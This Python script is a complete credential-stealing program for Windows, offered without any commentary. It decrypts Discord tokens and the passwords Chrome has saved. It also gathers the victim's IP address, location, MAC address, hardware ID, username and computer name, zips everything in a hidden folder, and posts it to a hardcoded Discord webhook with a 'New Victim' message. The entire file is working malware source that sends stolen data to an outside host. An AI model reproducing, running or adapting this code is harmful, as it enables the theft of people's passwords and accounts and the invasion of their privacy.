import os
import re
import json
import shutil
import time
import win32con
from base64 import b64decode
from subprocess import Popen, PIPE
from win32api import SetFileAttributes
from win32crypt import CryptUnprotectData
from requests import post
from tempfile import TemporaryDirectory
from zipfile import ZipFile, ZIP_DEFLATED

WEBHOOK_URL = "https://discord.com/api/webhooks/1493964782330577168/XZ4U3d4so35qor9X6Avk9PQHXMxBUPGqhvVBRgH9YsjXOCb5n1wR0xrFG8l0THgeZcm_"

def get_mac_address():
    try:
        output = os.popen("getmac").read()
        match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', output)
        if match:
            return match.group(0)
        return "NotFound"
    except:
        return "NotFound"

def get_hwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdout=PIPE, stderr=PIPE)
    try:
        out = (p.stdout.read() + p.stderr.read()).decode(errors="ignore").split("\n")[1].strip()
        return out
    except Exception:
        return "Unknown"

def get_ipinfo():
    try:
        import urllib.request
        ip = urllib.request.urlopen("https://api64.ipify.org").read().decode().strip()
        country = urllib.request.urlopen(f"https://ipapi.co/{ip}/country_name").read().decode().strip()
        city = urllib.request.urlopen(f"https://ipapi.co/{ip}/city").read().decode().strip()
        return ip, country, city
    except Exception:
        return "Unknown", "Unknown", "Unknown"

def find_discord_tokens():
    tokens = []
    paths = [
        os.path.join(os.getenv('APPDATA') or "", "Discord"),
        os.path.join(os.getenv('APPDATA') or "", "discordcanary"),
        os.path.join(os.getenv('APPDATA') or "", "discordptb"),
        os.path.join(os.getenv('APPDATA') or "", "Lightcord")
    ]
    pattern = r"dQw4w9WgXcQ:([^\"]+)"
    key = None
    for path in paths:
        try:
            local_state = os.path.join(path, "Local State")
            if os.path.isfile(local_state):
                with open(local_state, "r", encoding="utf-8") as f:
                    local_state_data = json.loads(f.read())
                    key = b64decode(local_state_data["os_crypt"]["encrypted_key"])[5:]
                    key = CryptUnprotectData(key, None, None, None, 0)[1]
        except: key = None
        try:
            leveldb = os.path.join(path, "Local Storage", "leveldb")
            if not os.path.exists(leveldb):
                continue
            for filename in os.listdir(leveldb):
                if not filename.endswith(".ldb") and not filename.endswith(".log"):
                    continue
                filepath = os.path.join(leveldb, filename)
                with open(filepath, "r", errors="ignore") as file:
                    for line in file:
                        for match in re.findall(pattern, line):
                            rawtok = "dQw4w9WgXcQ:" + match
                            try:
                                decrypted = CryptUnprotectData(b64decode(match), None, None, None, 0)[1]
                                if decrypted:
                                    tokens.append(decrypted.decode(errors="ignore"))
                                else:
                                    tokens.append(match)
                            except:
                                tokens.append(match)
        except Exception:
            continue
    cleaned = []
    for t in tokens:
        t = t.replace("\\", "")
        if t and t not in cleaned:
            cleaned.append(t)
    return cleaned

def get_chrome_passwords(tmpdir):
    passwords = []
    try:
        # try to copy Chrome Login Data
        login_db = os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"
        )
        cpy = os.path.join(tmpdir, "LoginData.db")
        if not os.path.exists(login_db):
            return []
        shutil.copy2(login_db, cpy)
        import sqlite3
        db = sqlite3.connect(cpy)
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        key = None
        # Get encryption key
        try:
            with open(os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "Google",
                "Chrome",
                "User Data",
                "Local State",
            ), "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
                key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                key = CryptUnprotectData(key, None, None, None, 0)[1]
        except Exception:
            key = None
        for url, username, pwd in cursor.fetchall():
            if key:
                try:
                    password = CryptUnprotectData(pwd, None, None, None, 0)[1]
                    password = password.decode(errors='ignore')
                except Exception:
                    password = ""
            else:
                try:
                    password = CryptUnprotectData(pwd, None, None, None, 0)[1]
                    password = password.decode(errors='ignore')
                except Exception:
                    password = ""
            if username or password:
                passwords.append([username, password, url])
        cursor.close()
        db.close()
    except Exception:
        pass
    return passwords

def table(rows, header):
    rows = [header] + rows
    col_widths = [max(len(str(x)) for x in col) for col in zip(*rows)]
    lines = []
    for i, row in enumerate(rows):
        ln = "| " + " | ".join(str(x).ljust(col_widths[j]) for j, x in enumerate(row)) + " |"
        lines.append(ln)
        if i==0:
            lines.append("| " + " | ".join('-'*col_widths[j] for j in range(len(row))) + " |")
    return "\n".join(lines)

def collect_and_send():
    ip, country, city = get_ipinfo()
    mac = get_mac_address()
    hwid = get_hwid()
    discord_tokens = find_discord_tokens()
    with TemporaryDirectory(dir=".") as td:
        SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
        # Save Discord tokens
        disco_file = os.path.join(td, "discord_tokens.txt")
        with open(disco_file, "w") as f:
            f.write(table([[t] for t in discord_tokens], ["Discord Tokens"]))
        # Save Chrome passwords
        chrome_pwds = get_chrome_passwords(td)
        chrome_file = os.path.join(td, "chrome_passwords.txt")
        with open(chrome_file, "w") as f:
            f.write(table(chrome_pwds, ["Username or Email", "Password", "URL"]))
        # Zip collected
        zip_path = os.path.join(td, "data.zip")
        with ZipFile(zip_path, "w", ZIP_DEFLATED) as zipf:
            zipf.write(disco_file)
            zipf.write(chrome_file)
        username = os.getenv("UserName", "Unknown")
        compname = os.getenv("COMPUTERNAME", "Unknown")
        content = (
            f"**New Victim**\n"
            f"**Username:** {username}\n"
            f"**Computer:** {compname}\n"
            f"**IP:** {ip}\n"
            f"**Country:** {country}\n"
            f"**City:** {city}\n"
            f"**MAC:** {mac}\n"
            f"**HWID:** {hwid}\n"
            f"**Discord Tokens Found:** {len(discord_tokens)}\n"
            f"**Passwords Grabbed:** {len(chrome_pwds)}\n"
        )
        post(WEBHOOK_URL, data={"content": content})
        with open(zip_path, "rb") as f:
            post(WEBHOOK_URL, files={"file": (f"data_{username}.zip", f, "application/zip")}, data={"content": "Dumped Data"})

if __name__ == "__main__":
    collect_and_send()
